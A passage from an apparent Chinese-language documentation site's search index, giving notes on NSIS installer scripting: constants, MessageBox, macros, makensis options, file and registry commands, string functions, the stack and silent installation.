C:\\winnt\\system32 但在运行时会检测) $TEMP 系统临时目录(通常为 C:\\windows\\temp 但在运行时会检测) $STARTMENU 开始菜单目录(常用于添加一个开始菜单项, 使用 CreateShortCut)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 $SMPROGRAMS 开始菜单程序目录(当你想定位 $STARTMENU\\程序 时可以使用它)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 $SMSTARTUP 开始菜单程序/启动 目录。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 $QUICKLAUNCH 在 IE4 活动桌面及以上的快速启动目录。如果快速启动不可用, 仅仅返回和 $TEMP 一样。 $DOCUMENTS 文档目录。一个当前用户典型的路径形如 C:\\Documents and Settings\\Foo\\My Documents。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量在 Windows 95 且 Internet Explorer 4 没有安装时无效。 $SENDTO 该目录包含了\"发送到\"菜单快捷项。 $RECENT 该目录包含了指向用户最近文档的快捷方式。 $FAVORITES 该目录包含了指向用户网络收藏夹、文档等的快捷方式。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量在 Windows 95 且 Internet Explorer 4 没有安装时无效。 $MUSIC 用户的音乐文件目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量仅在 Windows XP、ME 及以上才有效。 $PICTURES 用户的图片目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量仅在 Windows 2000、XP、ME 及以上才有效。 $VIDEOS 用户的视频文件目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量仅在 Windows XP、ME 及以上才有效。 $NETHOOD 该目录包含了可能存在于我的网络位置、网上邻居文件夹的链接对象。 该常量在 Windows 95 且 Internet Explorer 4 和活动桌面没有安装时无效。 $FONTS 系统字体目录。 $TEMPLATES 文档模板目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 $APPDATA 应用程序数据目录。当前用户路径的检测需要 Internet Explorer 4 及以上。所有用户路径的检测需要 Internet Explorer 5 及以上。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量在 Windows 95 且 Internet Explorer 4 和活动桌面没有安装时无效。 $PRINTHOOD 该目录包含了可能存在于打印机文件夹的链接对象。 该常量在 Windows 95 和 Windows 98 上无效。 $INTERNET_CACHE Internet Explorer 的临时文件目录。 该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。 $COOKIES Internet Explorer 的 Cookies 目录。 该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。 $HISTORY Internet Explorer 的历史记录目录。 该常量在 Windows 95 和 Windows NT 且 Internet Explorer 4 和活动桌面没有安装时无效。 $PROFILE 用户的个人配置目录。一个典型的路径如 C:\\Documents and Settings\\Foo。 该常量在 Windows 2000 及以上有效。 $ADMINTOOLS 一个保存管理工具的目录。这个常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 该常量在 Windows 2000、ME 及以上有效。 $RESOURCES 该资源目录保存了主题和其他 Windows 资源(通常为 C:\\Windows\\Resources 但在运行时会检测). 该常量在 Windows XP 及以上有效。 $RESOURCES_LOCALIZED 该本地的资源目录保存了主题和其他 Windows 资源(通常为 C:\\Windows\\Resources\\1033 但在运行时会检测). 该常量在 Windows XP 及以上有效。 $CDBURN_AREA 一个在烧录 CD 时储存文件的目录。. 该常量在 Windows XP 及以上有效。 $HWNDPARENT 父窗口的十进制 HWND。 $PLUGINSDIR 该路径是一个临时目录, 当第一次使用一个插件或一个调用 InitPluginsDir 时被创建。该文件夹当解压包退出时会被自动删除。这个文件夹的用意是用来保存给 InstallOptions 使用的 INI 文件、启动画面位图或其他插件运行需要的文件。 部分特殊字符 部分特殊字符: $$: 表示$ $\\r: 表示\\r $\\n: 表示\\n $\\t: 表示\\t if语句 语法: ${If} $0 == 1 # do something ${EndIf} 还有: ${OrIf} 即 or ${AndIf} 即 and 特意测试了一下, 比较的时候加不加引号无影响. 测试引号判断 测试源码. 消息框(MessageBox) 显示一个包含\"消息框文本\"的消息框。\"消息框选项列表\"必须为 mb_option_list 的一个或多个, 多个使用 | 来隔开 语法: MessageBox mb_option_list messagebox_text [/SD return] [return_check jumpto [return_check_2 jumpto_2]] 各个部分释义: mb_option_list: MB_OK 展示 OK 按钮 MB_OKCANCEL 展示 OK, CANCEL 按钮 MB_ABORTRETRYIGNORE 展示 ABORT, RETRY, IGNORE 按钮. 退出、重试、忽略按钮 MB_RETRYCANCEL 展示 retry, cancel 按钮 MB_YESNO 展示 yes and no buttons MB_YESNOCANCEL 展示 with yes, no, cancel buttons MB_ICONEXCLAMATION 展示 with exclamation icon. 显示惊叹号图标 MB_ICONINFORMATION 展示 with information icon. 显示信息图标 MB_ICONQUESTION 展示 with question mark icon. 显示问号图标 MB_ICONSTOP 展示 with stop icon. 显示终止图标 MB_USERICON 展示 installer's icon MB_TOPMOST 置顶 messagebox. 使消息框在最前端显示 MB_SETFOREGROUND 设置前景? (Set foreground) MB_RIGHT 文本靠右对齐 MB_RTLREADING RTL reading order. RTL 阅读次序 MB_DEFBUTTON1 Button 1 is default MB_DEFBUTTON2 Button 2 is default MB_DEFBUTTON3 Button 3 is default MB_DEFBUTTON4 Button 4 is default return_check: 0 empty left off # can be 0 (or empty, or left off) IDABORT Abort button IDCANCEL Cancel button IDIGNORE Ignore button IDNO No button IDOK OK button IDRETRY Retry button IDYES Yes button 传参(如返回值设置等) 语法: Push 'xxx' Pop $0 栈的形式, Push压栈, 获取就Pop 如, 返回值的函数: Function simpleTest MessageBox MB_OKCANCEL|MB_ICONQUESTION \\ \"点击确定取消\"\\ /SD IDOK \\ IDOK ok \\ IDCANCEL cancel # 这里算是调用 MessageBox 后的回调 ok: Push \"OK\" Goto +2 cancel: Push \"CANCEL\" FunctionEnd 在.oninit中调用如下: Function .onInit Call simpleTest Pop $0 # 这里获取返回值 ${If} $0 == \"CANCEL\" MessageBox MB_OK|MB_ICONEXCLAMATION \"点击的是取消\" ${Else} MessageBox MB_OK|MB_ICONEXCLAMATION \"点击的是确定\" ${EndIf} FunctionEnd macros(宏) 编译时, 插入代码 宏与 NSIS_自定义函数 类似, 使用有个较明显的区别是: 宏定义后支持在几乎任何位置的插入 函数定义后, 若要同时支持在卸载的时候调用, 需要加 un. 前缀再写一个 例: ; 定义宏 !macro MyFunc UN Function ${UN}MyFunc Call ${UN}DoRegStuff ReadRegStr $0 HKLM Software\\MyProgram key DetailPrint $0 FunctionEnd !macroend !insertmacro MyFunc \"\" !insertmacro MyFunc \"un.\" 结果将会插入两个, 一个给安装时候用, 一个给卸载时候用, 也可以直接: ; 定义宏 !macro MyFunc Call ${UN}DoRegStuff ReadRegStr $0 HKLM Software\\MyProgram key DetailPrint $0 !macroend !insertmacro MyFunc !insertmacro MyFunc 效果一致. 一些脚本属性 NAME : 设置安装器名称 (支持多个, 多语言设置时使用, 默认使用第一个). 如: Name \"Foo & Bar\" \"Foo && Bar\" InstallDir : 设置默认的安装路径 OutFile : 打好的exe包输出路径(包含文件名) ShowInstDetails : 值为 show 表示显示安装详细信息 ShowUnInstDetails : 值为 show 表示显示卸载详细信息 BrandingText : 左下角提示信息 (一般是 品牌/公司 名称) 一些通用属性, 编译标志, 版本信息: instattribs","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html"},{"title":"makensis指令","text":"使用nsis脚本命令行打包 前置, 设置好环境变量: NSISDIR NISI 安装目录, 与可在脚本定义的 ${NSISDIR} 一致 NSISCONFDIR NISI 配置文件目录 APPDATA(windows) / HOME(not windows) 加载用户配置文件 语法: makensis [ option | script.nsi | - ] [...] 选项说明: /LICENSE 显示license信息 /V=<[0-4]> 相关信息输出. 只能是 0-4 0 不输出 1 仅error信息 2 warnings and errors 3 info, warnings, and errors 4 所有级别信息 /P=<[0-5]> 设置安装优先级. 只能是 0-5 0 空闲(idle)时安装 1 below normal 2 normal (default) 3 above normal 4 high 5 realtime. 实时安装? /O=<filename> 将输出写入到 filename (不输出到屏幕). /LAUNCH executes the generated installer. 执行生成的安装程序 /PAUSE makes makensis pause before quitting, which is useful when executing directly from Windows. 在退出之前暂停 /NOCONFIG disables inclusion of nsisconf.nsh. Without this parameter, installer defaults are set from nsisconf.nsh. /CMDHELP prints basic usage information for command (if specified), or all commands (if command is not specified). /HDRINFO prints information about which options were used to compile makensis. /NOCD disables the current directory change to that of the .nsi file /INPUTCHARSET allows you to specify a specific codepage for files without a BOM. (ACP|OEM|CP#|UTF8|UTF16<LE|BE>) /OUTPUTCHARSET allows you to specify the codepage used by stdout when the output is redirected. (ACP|OEM|CP#|UTF8[SIG]|UTF16<LE|BE>[BOM]) /PPO, /SAFEPPO will only run the preprocessor and print the result to stdout. The safe version will not execute instructions like !appendfile or !system. !packhdr and !finalize are never executed. /WX treats warnings as errors /D switch one or more times will add to symbols to the globally defined list (See !define). /X switch one or more times will execute the code you specify following it. Example: \"/XAutoCloseWindow false\" Specifying a dash (-) for the script name will tell makensis to use the standard input as a source. 注解 注意参数顺序 官网: usage","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html"},{"title":"nsis 指令","text":"文件、目录操作 FileOpen/FileWrite/FileClose 可用于创建文件, 写入文件: FileOpen $9 apachesrvin.bat w ;Opens a Empty File and fills it FileWrite $9 \"cd $INSTDIR\\apache$\\r$\\n\" FileWrite $9 \"apache -n Apache -k install$\\r$\\n\" FileWrite $9 \"net start Apache$\\r$\\n\" FileWrite $9 \"exit$\\r$\\n\" FileClose $9 ;Closes the filled file 上面这段代码里的 $9 表示创建的文件指针赋给此变量, 类似: $9 = open('apachesrvin.bat') File 作用: 释放文件到当前输出路径。 选项: /nonfatal 且当文件未找到时使用警告来代替错误 /a 被添加的文件的属性将会保持 /r 匹配的文件将会在子目录里被递归的搜索。如果目录名匹配则所有包含的内容都会被递归添加, 目录结构也会被保持 /x 排除文件或目录 Delete 作用: 从目标系统删除文件 例, 删除文件: Delete \"$SMPROGRAMS\\Test.exe\" Rename 作用: 把源文件重命名为目标文件 例, 重命名文件: Rename $INSTDIR\\file1 $INSTDIR\\file2 CreateDirectory 作用: 创建 (递归创建) 指定的目录。当目录不能创建时会放置一个错误标记。你也可以指定一个绝对路径。 例, 在默认Program Files目录下创建一个Temp目录: CreateDirectory \"$SMPROGRAMS\\Temp\" RMDir 作用: 删除目录 例, 删除Resources及其子目录: RMDir /r $INSTDIR\\Resources SetOutPath 作用: 设置输出路径($OUTDIR)且当路径不存在时创建(需要时会递归创建)。必须为绝对路径名, 通常都使用 $INSTDIR。 例, 将用户定义的解压路径作为输出目录: SetOutPath $INSTDIR CreateShortCut 作用: 创建快捷文件.lnk 目标文件 例, 设置Test.exe的快捷方式Test.lnk, 图标为Test.ico: CreateShortCut \"$DESKTOP\\Test.lnk\" \"$DESKTOP\\Test.exe\" \"$DESKTOP\\Icon\\Test.ico\" 注册表操作 WriteRegStr/WriteRegExpandStr 关于Win64下写注册表时候的一些问题 当使用nsis写入到 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall 下时, 系统的注册表编辑器并不会显示此项, 而是显示在 HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall , 这是因为控制面板的\"程序和功能\"是基于注册表反射来实现的。对于64位系统,它只显示 Wow6432Node 下的注册表键,而不显示原生的64位键. 要让卸载信息显示在控制面板中,nsis 在 64位系统下需要同时写入 Wow6432Node 下的对应键。一般的方法是: 首先写入原生键,如 HKLMSoftwareMicrosoftWindowsCurrentVersionUninstallApp 调用 SetRegView 64 来切换到 32位视图 写入 Wow6432Node\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\App 调用 SetRegView last 恢复注册表视图 继续写入原生的其他键 作用: 把字符串写入注册表。根键必须为下面列表之一: HKCR 或 HKEY_CLASSES_ROOT HKLM 或HKEY_LOCAL_MACHINE HKCU 或HKEY_CURRENT_USER HKU 或HKEY_USERS HKCC 或HKEY_CURRENT_CONFIG HKDD 或HKEY_DYN_DATA HKPD 或HKEY_PERFORMANCE_DATA SHCTX 或SHELL_CONTEXT 如果字串不能写入注册表则放置一个错误的标记。 字串的类型为 REG_SZ 对应 WriteRegStr, 或 REG_EXPAND_STR 对应 WriteRegExpandStr。 如果注册表键不存在则会自动创建。 例, 将程序信息写入注册表: Section -Post WriteUninstaller \"$INSTDIR\\uninst.exe\" WriteRegStr HKLM \"PRODUCT_DIR_REGKEY\" \"\" \"$INSTDIR\\Test.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayName\" \"$(&#94;Name)\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"UninstallString\" \"$INSTDIR\\uninst.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayIcon\" \"$INSTDIR\\Test.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayVersion\" \"${PRODUCT_VERSION}\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"URLInfoAbout\" \"${PRODUCT_WEB_SITE}\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"Publisher\" \"${PRODUCT_PUBLISHER}\" SectionEnd ReadRegDWORD/ReadRegStr 作用: 读取注册表信息 例, 在注册表中读取.net 版本: Function GetNetFrameworkVersion Push $1 Push $0 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"InstallSuccess\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"2.0.50727.832\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"1.1.4322.573\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"1.0.3705.0\" StrCmp $0 1 KnowNetFrameworkVersion +1 StrCpy $1 \"not .NetFramework\" KnowNetFrameworkVersion: Pop $0 Exch $1 FunctionEnd DeleteRegKey 作用: 删除一个注册表键。如果指定了 /ifempty, 则该注册表键仅当它无子键时才会被删除(否则, 整个注册表键将被删除). 有效的根键值在后面的 WriteRegStr 列出。如果该键不能被删除(或如果它不存在)则会放置一个错误的标记。 例, 清除注册表信息: DeleteRegKey PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" DeleteRegKey HKLM \"${PRODUCT_DIR_REGKEY}\" SetAutoClose true INI文件操作 ReadINIStr 语法: ReadINIStr 用户变量(输出) INI文件 区段 项 作用: 读取INI文件。从 \"INI文件\" 的 \"区段\" 区段读取 \"项\" 的值并把该值输出到用户变量。 如果该项未找到时会放置一个错误标记且该用户变量被赋为空值。 例, 读取TimeZoneZh.ini文件中Field 1区段的State项, 将值输出到$0: ReadINIStr $0 \"PLUGINSDIR\\TimeZoneZh.ini\" \"Field 1\" \"State\" 调用外部程序 Exec 作用: 执行一个指定的程序并且立即继续安装, 就是直接执行一个程序。 注解 指定的文件必须存在于目标系统上, 而不是编译系统上 $OUTDIR 设置工作目录. 如果无法启动进程，则会设置错误标志 如果命令可以有空格, 则应将其放在引号中以从参数中分隔它 例, 安装Microsoft.NET.exe, 程序不等待继续执行下个步骤: Exec '$INSTDIR\\Microsoft.NET.exe' ExecShell 启动 ShellExecute 执行. 语法: ExecShell action command [parameters] [SW_SHOWNORMAL | SW_SHOWMAXIMIZED | SW_SHOWMINIMIZED | SW_HIDE] action有: open , 正常打开, 支持exe文件, bat脚本等能直接运行的文件 print runas , 以管理员权限打开文件(会弹出一个申请提权的弹窗) 若 action 为空表示使用默认动作 command 表示执行命令, 内容为 可执行文件全路径 . parameters 为 command 的参数, 可为重定向符号如: 2>&1 > log.txt SW_HIDE 隐藏执行命令打开的窗口 ExecWait 执行一个指定的程序并且 等待运行处理结束 语法: ExecWait command [user_var(exit code)] 例, 静默安装并等待结束: ExecWait '\"$INSTDIR\\someprogram.exe /quiet /norestart\"' $0 若执行产生错误, 可使用 IfErrors 来进行判断, 此时: 若指定了 [user_var(exit code)] , 则 ExecWait 会把变量设为返回代码. 即 user_var = exit code 若未指定 [user_var(exit code)] , 则 ExecWait 会放置一个错误标记. 注解 若命令存在空格, 使用引号包裹 ReserveFile 作用: 把文件保存在稍后使用的数据区块用于下面的调用。有时, 预先打包文件, 方便安装加速释放之用。 语法: ReserveFile [/nonfatal] [/r] [/x file|wildcard [...]] file [file...] 例: ReserveFile \"TimeZoneZh.ini\" RegDLL 作用: 载入指定的 DLL 并且调用 DllRegisterServer (或入口点名称, 当指定之后). 当产生一个错误的时候会置一个错误标记 (例如不能载入 DLL, 不能初始化 OLE, 不能找到入口点, 或者函数返回任何其它错误 ERROR_SUCCESS (=0)). 其实就是注册或加载你要的插件! 例: SetOutPath $INSTDIR RegDLL $INSTDIR\\foo.dll UnRegDLL 作用: 注销DLL插件 例, 注销TIMProxy.dll插件: UnRegDLL $INSTDIR\\foo.dll !include 作用: 包含头文件 例, 引用\"MUI.nsh\"头文件: !include \"MUI.nsh\" !insertmacro 作用: 插入宏 例, 通过宏插入欢迎页面: !insertmacro MUI_PAGE_WELCOME 字符串操作 StrCpy 作用: 复制字符串 语法: StrCpy user_var(destination) str [maxlen] [start_offset] str 可以包含其他变量 maxlen 设置截取 str 的长度, 默认全部长度; 为负数表示截取至此位置. maxlen为负数表示截取至此位置, eg: StrCpy $1 \"D:\\Program Files\\test\\Example One\\uninstall.exe\" StrCpy $6 $1 -13 MessageBox MB_OK \"0 res $6\" 结果就是: D:\\Program Files\\test\\Example One\\ StrCmp 作用: 比较(不区分大小写)\"字串1\"和\"字串2\", 如果两者相等, 跳转到\"相同时跳转的标记\", 否则跳转到\"不相同时跳转的标记\"。 语法: StrCmp str1 str2 jump_if_equal [jump_if_not_equal] StrLen 作用：获取str的长度 例如: StrLen $0 \"123456\" # $0 = 6 其他字符串操作, 需要先导入 WordFunc.nsh: !include WordFunc.nsh WordFind WordFind, 在给定字符串中查找使用指定的分隔符分隔的字符串, 如从字符串 \"first;second;third;forth\" 中查找第二个字符串: ${WordFind} \"first;second;third;forth\" \";\" +2 $R0 # $R0 = second WordFind2X WordFind2X, 在给定字符串中查找使用指定的两个分隔符包围的字符串, 如 从字符串 <System>|<Guest>|<User> 中查找第三个字符串，也就是倒数第一个，即User: ${WordFind2X} \"<System>|<Guest>|<User>\" \"<\" \">\" -1 $R0 WordFind3X WordFind3X, 与WordFind2X比较相似，用于在给定字符串中查找使用指定的两个分隔符包围且含有指定字符串的字符串 语法: ${WordFind3X} \"[string]\" \"[delimiter1]\" \"[center]\" \"[delimiter2]\" \"[E][options]\" $var 如查找 [/install=11], [/update=22], [/start=33] 中 /update 的整个内容: ${WordFind3X} \"[/install=11], [/update=22], [/start=33]\" \"[\" \"/update\" \"]\" +1 $0 # $0 = \"/update=22\" 见: nsis:WordFind3X WordReplace WordReplace, 从字符串中替换或删除词语, 语法: # ${WordReplace} \"[字符串]\" \"[词语1]\" \"[词语2]\" \"[E][选项]\" $输出变量 ${WordReplace} \"[string]\" \"[word1]\" \"[word2]\" \"[E][options]\" $var 选项这里的第几个下标从1开始, 例: Section ${WordReplace} \"C:\\io.sys C:\\logo.sys C:\\WINDOWS\" \"SYS\" \"bmp\" \"+2\" $R0 ; $R0=\"C:\\io.sys C:\\logo.bmp C:\\WINDOWS\" SectionEnd 见: nsis:WordReplace WordAdd WordAdd, 从选项中指定的 字符串2 添加词语到 字符串1(如果不存在)，或删除词语(如果存在)。语法: ${WordAdd} \"[字符串1]\" \"[分隔符]\" \"[E][选项]]\" $输出变量 WordInsert WordInsert, 在字符串中插入词语。语法: ${WordInsert} \"[字符串]\" \"[分隔符]\" \"[词语]\" \"[E][选项]]\" $输出变量 StrFilter StrFilter, 转换字符串为大写或小写；设置符号过滤。语法: ${StrFilter} \"[字符串]\" \"[选项]\" \"[符号1]\" \"[符号2]\" $输出变量 VersionCompare VersionCompare, 用来比较版本号的大小。例如，比较1.1.0.1和1.1.1.0的大小。语法: ${VersionCompare} \"[版本1]\" \"[版本2]\" $输出变量 VersionConvert VersionConvert, 将带字母的版本转换为可用于比较的十进制数版本号。语法: ${VersionConvert} \"[版本]\" \"[字符列表]\" $输出变量 用法示例: ${VersionConvert} \"9.0c\" \"\" $R0 # $R0 = 9.0.03 .这样转换后可以用于和别的版本如9.0a比较。 数学计算 IntOp 10减去2, eg: IntOp $0 10 - 2 效果是计算 10-2 , 将结果8赋值给 $0 . 文件目录遍历 FindFirst/FindNext/FindClose 这三个一般一起使用 FindFirst语法: FindFirst user_var(handle output) user_var(filename output) filespec 第一个 handle output 是搜索的文件句柄 第二个 filename output 是找到的文件名(不包含前缀目录) filespec 是搜索的路径描述, 支持简单通配符 eg: FindFirst $0 $1 $INSTDIR\\*.txt loop: StrCmp $1 \"\" done DetailPrint $1 FindNext $0 $1 Goto loop done: FindClose $0 逻辑操作 IfAbort 如果调用abort，它将\"返回\"为true。 语法: IfAbort label_to_goto_if_abort [label_to_goto_if_no_abort] 如果用户选择对无法创建（或覆盖）的文件进行中止，或者用户手动中止，则会发生这种情况。只能从instfiles 页面的leave函数调用此函数: Function instfilesLeave IfAbort 0 +2 MessageBox MB_OK \"user aborted\" FunctionEnd IfErrors 错误时跳转 语法: jumpto_iferror [jumpto_ifnoerror] 检测并清除错误标记, 如果设了错误标记, 则跳转到\"错误时跳转的标记\", 否则跳转到\"没有错误时跳转的标记\"。 可使用 ClearErrors 在之前清除其他地方的错误标记 IfFileExists 语法: IfFileExists file_to_check_for jump_if_present [jump_otherwise] 检测 file_to_check_for 是否存在(可以用通配符, 或目录) 当文件存在时跳转到 file_to_check_for 否则跳转到 jump_otherwise . 例1, 官网例子: IfFileExists $WINDIR\\notepad.exe 0 +2 MessageBox MB_OK \"notepad is installed\" 例2: IfFileExists $WINDIR\\notepad.exe fileExists fileNotExists fileExists: # do something Goto done fileNotExists: Abort done: Goto 作用: 跳转到指定标记。 nsi脚本常常使用相对跳转表示条件分枝 语法: Goto label_to_jump_to | +offset| -offset| user_var(target) +offset 表示从当前位置往前跳转 offset 条语句, -offset 表示从当前位置往后跳转 offset 条语句. user_var 表示跳转到指定变量标记位置. 例, 按数字跳转: Goto +4 ; 跳转以下4条语句 Goto -3 ; 跳转到前3条语句 例, 按标记跳转: goto_example ClearErrors 当程序运行产生错误时, 可以使用 NSIS_IfErrors 判断, 返回 true/false , 表示存在错误. ClearErrors 可以清除当前已有的错误标记 堆栈操作 其实 也属于逻辑操作 NSIS 脚本没有 reture 这种返回值, 只能使用 栈 的方式在函数之前传递参数(或者全局变量) Pop Push Exch Pop 从栈顶取出一个参数. 如将栈顶元素取出, 赋值给 $0 Pop $0 Push 向栈种压入参数. 如压入 \"change\" Push \"change\" Exch 语法: Exch [user_var|stack_index] 默认交换栈顶的两个元素, 如: Push 1 Push 2 Exch Pop $0 # = 1 若指定了 [user_var|stack_index] : 若指定了用户变量, 使用用户变量与栈顶元素交换 如: Push 2 Exch $0 # = 2 若指定了整型(int), 即栈的索引, 使用索引位置的元素与栈顶元素交换 注意, 索引从0开始, 栈顶索引为0 如: Push 1 Push 2 Push 3 Exch 2 Pop $0 # = 1 如果需要交换的元素个数不足, 如索引越界等, 报错 获取命令行参数 官网地址: GetOptions GetParameters GetOptions GetParameters 语法: ${GetParameters} $var 例: ${GetParameters} $R0 ; $R0=\"[parameters]\" GetOptions 语法: ${GetOptions} \"[Parameters]\" \"[Option]\" $var \"[Parameters]\" ; command line parameters ; \"[Option]\" ; option name ; $var ; Result: option string 例: !include \"FileFunc.nsh\" !insertmacro GetOptions !insertmacro GetParameters Section ${GetOptions} \"-INSTDIR=C:\\Program Files\\Common Files -SILENT=yes\" \"-INSTDIR=\" $R0 ;$R0=C:\\Program Files\\Common Files SectionEnd 不能写到一起, 比如以下这条语句是错误的: ${GetOptions} ${GetParameters} \"-INSTDIR=\" $R0 例2, 命令行为: foo.exe /S /USERNAME=Bar /D=C:\\Program Files\\Foo 脚本内容为: !include FileFunc.nsh !insertmacro GetParameters !insertmacro GetOptions Function .onInit ${GetParameters} $R0 ClearErrors ${GetOptions} $R0 /USERNAME= $0 FunctionEnd 效果: 将 /USERNAME= 后的值赋值给 $0 , 这样就支持了自定义命令行参数. 关于 /S (静默安装参数)的判断 静默安装系统有提供默认的判断, 不需要手动去获取命令行了: Function .onInit IfSilent jumpToSlient jumpNotSilent jumpToSlient: ; 静默安装的操作 Goto done jumpNotSilent: ; 非静默安装操作 Goto done done: FunctionEnd 也可以直接定义全局变量吧 静默安装实现 /S 参数 执行的时候使用, 如 xxx.exe /S SetSilent SilentInstall and SilentUninstall SetSilent 脚本里设置: SetSilent silent | normal 只能在 .onInit. 被使用 SilentInstall 用法: SilentInstall normal|silent|silentlog SilentUninstall 用法: SilentUnInstall normal|silent 判断是否是静默安装 使用 IfSilent IfSilent +2 ExecWait '\"$INSTDIR\\nonsilentprogram.exe\"' 这里没懂 +2 是什么意思","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-NSIS-instruction.html"},{"title":"脚本结构","text":"属性定义: NSIS_变量 包的导入: NSIS_导入其他脚本 页面配置: 向导页 区段 函数: 回调函数 ; 自定义函数 向导页 向导页(Page) 古典页面 语法: Page [Custom] <name|function> 如果使用 Custom 后面跟自定义函数, 表示自定义的向导页面, 一个函数就是一个页面, 可直接根多个. 非静默安装, 安装向导页面设置(设置显示哪些界面): Page license Page components Page directory Page instfiles UninstPage uninstConfirm UninstPage instfiles 现代页面(宏定义) 例如: ; 欢迎页面 !insertmacro MUI_PAGE_WELCOME ; 许可协议页面 !insertmacro MUI_PAGE_LICENSE \"LicenceDeclare.txt\" ; 安装目录选择页面 !insertmacro MUI_PAGE_DIRECTORY ; 安装过程页面 !insertmacro MUI_PAGE_INSTFILES ; 安装完成页面 !insertmacro MUI_PAGE_FINISH ; 安装卸载过程页面 !insertmacro MUI_UNPAGE_INSTFILES ; 安装界面包含的语言设置 !insertmacro MUI_LANGUAGE \"SimpChinese\" ; 安装预释放文件 !insertmacro MUI_RESERVEFILE_INSTALLOPTIONS ; ------ MUI 现代界面定义结束 ------ 还可以使用: !insertmacro # 和 !define 命令进行更多安装页面和安装功能的设置. 如安装时对开始菜单、桌面快捷启动图标的设置等. 组件(自定义节/区段) 对应某种安装/卸载选项的处理逻辑, 该段代码仅当用户选择相应的选项才被执行. 卸载程序的区段名用\"un.\"作为前缀. 有些应用程序允许安装额外的组件, 比如安装的时候, 显示可选的组件, 让用户选择哪些组件可以安装. 使用 Section Section \"Installer Section\" SectionEnd 卸载的时候也支持可选卸载, 在名称前加 un 即可: Section \"un.Uninstaller Section\" SectionEnd 注解 Section 支持设置多个, 表示多个组件部分可选 区段名的修饰符: /o 表示该区段默认不选上 - 表示隐藏区段(匿名区段也是隐藏区段) ! 表示需要粗体显示的区段。 另外还有: SectionIn 表示该区段和安装类型之间的关系 语法: SectionIn insttype_index [insttype_index] ... [RO] ; RO 修饰符表示不可修改。 SubSection表示子区段 语法: SubSection [/e] Caption [subsection_name index output] ;修饰符 /e 用于该子区段的所有区段是否默认展开。 自定义函数 语法: Function fun_name # do something FunctionEnd 调用: Call fun_name 预定义函数-回调函数 安装逻辑的回调函数: .onGUIInit .onInit .onInstFailed .onInstSuccess .onGUIEnd .onMouseOverSection .onRebootFailed 